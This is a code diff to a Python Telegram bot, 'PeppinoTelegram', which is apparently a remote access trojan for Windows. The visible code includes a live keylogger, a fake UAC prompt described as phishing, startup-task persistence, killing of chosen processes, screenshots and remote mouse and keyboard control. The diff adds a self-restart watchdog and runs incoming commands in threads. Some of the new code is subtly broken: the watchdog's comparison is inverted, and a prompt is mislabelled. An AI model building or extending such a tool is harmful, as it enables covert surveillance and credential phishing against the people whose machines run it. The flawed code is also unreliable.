@@ -450,8 +450,11 @@ class PeppinoTelegram:
         # this is used to send input prompts to the user without stopping the code
         self.user = {
             "status":None,             #can be "input_requested" or None 
-            "last_response":None       #can be None, or the last response of an input
+            "last_response":None,       #can be None, or the last response of an input
+            "last_message_timestamp":None,
         }
+
+        self.RESTART_TIME_TRESHOLD = 1 * 5 # After this seconds are passed and no message was received the bot will restart itself assuming it crashed or got blocked in some loop
 
         self.MOUSE_JMP = 50
 
@@ -725,7 +728,8 @@ class PeppinoTelegram:
         press_key('f4')
         release_key('f4')
         release_key('alt')
-
+    
+    @requires_admin
     def add_as_task(self, task_name):
         if create_startup_task(task_name, FROZEN):
             self.bsendWithHtml(
@@ -747,7 +751,7 @@ class PeppinoTelegram:
             }
         ) == "y"
     
-    @requires_admin
+    #@requires_admin
     def block_chrome(self, timeout: int) -> None:
         raise NotImplemented
         print(f"Blocking chrome for {timeout} seconds")
@@ -983,7 +987,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def chat(self) -> None:
         bk_user_name = self.send_prompt("Name for the chat")
         if not bk_user_name:
-            self.operation_canceled("Operation timed out")
+            self.action_timed_out()
             return None
         chat = ChatRoom()
         interface = BackendUser(
@@ -1028,6 +1032,20 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             for process in self.cantopenlist:
                 if self.check_if_proc_running(process):
                     terminate_process_by_name(process)
+            sleep(1)
+
+    def crash_time_handler(self) -> None:
+        print("Starting crashtime handler")
+        while self.running:
+            if (not self.getLastMessageTimestamp()) or (not self.RESTART_TIME_TRESHOLD):
+                continue
+            if monotonic()-self.getLastMessageTimestamp() < self.RESTART_TIME_TRESHOLD:
+                self.restart(
+                    confirm=False,
+                    verbose=True,
+                    custom_message="🔄 Restarting: messages timed out."
+                )
+
             sleep(1)
 
     def cantopenmenu(self) -> None:
@@ -1180,7 +1198,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def fakeuac(self) -> None:
         # TODO remove the executable and build it inside the code
         # also maybe with a new phishing menu with other phishing methods
-        return NotImplemented
+        raise NotImplemented
         print("Showing fake UAC prompt")
         proc = sp.run(fake_uac_prompt_path, stdout=sp.PIPE, stderr=sp.PIPE)
         if proc.returncode:
@@ -1211,6 +1229,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         message_id = msg["message_id"]
         user = msg['from']
         username = user.get('username') or "N/A"
+        self.user["last_message_timestamp"] = monotonic()
 
         if chat_id == self.owner_id:
             self.owner_name = sender_name
@@ -1254,6 +1273,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print("Getting public IP")
         output = get_public_ip()
         self.bsend(f"🌐 Public IP: {output}")
+
+    def getLastMessageTimestamp(self) -> float|int|None:
+        return self.user["last_message_timestamp"]
 
     def get_audio_wintoasts(self) -> None:
         names = sorted(WinotifyAudioMap.keys())
@@ -1462,6 +1484,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def leftclick(self) -> None:
         print("Left mouse click")
+        self.bsendWithHtml("🖱️ Pressing <b>left click</b>")
         pg.leftClick()
 
     def live_keylogger(self, timeout=10) -> None:
@@ -1558,6 +1581,17 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.MOUSE_JMP = jmp
         else:
             self.bsend("Mouse jump must be numeric.")
+
+    def setTimeoutRestart(self) -> None:
+        print(f"Setting value for RESTART_TIME_TRESHOLD")
+        rtt = self.send_prompt("Set mouse jump: ")
+        if rtt is None:
+            self.action_timed_out()
+        elif rtt.isnumeric():
+            self.RESTART_TIME_TRESHOLD = int(rtt.split(".")[0]) #Yeah this is pretty ugly
+            self.bsendWithHtml(f"The value for <b>RESTART_TIME_TRESHOLD</b> was set to <code>{self.RESTART_TIME_TRESHOLD}</code>")
+        else:
+            self.operation_canceled("Only use integers")
 
     def setJumpscareVolume(self, volume: int= None) -> None:
         print(f"Setting jumpscare's volume to: {volume}")
@@ -1858,6 +1892,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
         self.bsendWithHtml(message)
 
+    def action_timed_out(self) -> None:
+        self.operation_canceled("Action timed out.")
+
     def parse_audio(self, msg: dict) -> None:
         print("Parsing audio message")
         if 'voice' in msg:
@@ -2121,9 +2158,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             elif ";" in text:
                 commands = text.split(";")
                 for command in commands:
-                    self.parse_command(command) 
+                    Thread(target=self.parse_command, args=(command,)).start()
             else:
-                self.parse_command(text)
+                Thread(target=self.parse_command, args=(text,)).start()
 
         elif self.user["status"] == "input_requested":
             print(f"New last_response set: {text.strip()=}")
@@ -2239,8 +2276,15 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         keyboard = [commands[i:i + 2] for i in range(0, len(commands), 2)]        
         return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)
 
-    def restart(self) -> None:
-        if self.ask_yesno():
+    def restart(self, confirm=True, verbose=True, custom_message: str|None=None) -> None:
+        doit = True if not confirm else self.ask_yesno()
+        if verbose:
+            self.bsendWithHtml("""<b>🔄 Bot Restarting</b>
+
+The bot is now restarting. Please wait a moment...
+
+<i>⏱️ This may take a few seconds</i>""" if not custom_message else custom_message)
+        if doit:
             restart()
 
     def randomkeyboard(self, timeout: int =5) -> None:
@@ -2479,6 +2523,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def rightclick(self) -> None:
         print("Right mouse click")
+        self.bsendWithHtml("🖱️ Pressing <b>right click</b>")
         pg.rightClick() #no shit
 
     def screenshot(self) -> None: #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
@@ -2596,7 +2641,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         )
 
         if selected_key is None:
-            self.operation_canceled("Operation Timed Out")
+            self.action_timed_out()
             return None
 
         self.bsendWithHtml(f"Selected position: <b>{options[selected_key]}</b>")
@@ -2926,7 +2971,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             pass
 
         if chosen_key is None:
-            self.operation_canceled("Operation Timed Out")
+            self.action_timed_out()
             return None
 
         return chosen_key
@@ -2968,6 +3013,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.cantopenthread = Thread(target=self.cantopenkiller)
         self.cantopenthread.start()
         STARTING_LOG_MESSAGE.edit("💀 PROGRAM KILLER STARTED")
+
+        self.timed_restart_thread = Thread(target=self.crash_time_handler)
+        self.timed_restart_thread.start()
+        STARTING_LOG_MESSAGE.edit("🔄 RESTART TIME HANDLER STARTED")
 
         self.processmonthread = Thread(target=self.processmonitorloop)
         self.processmonthread.start()
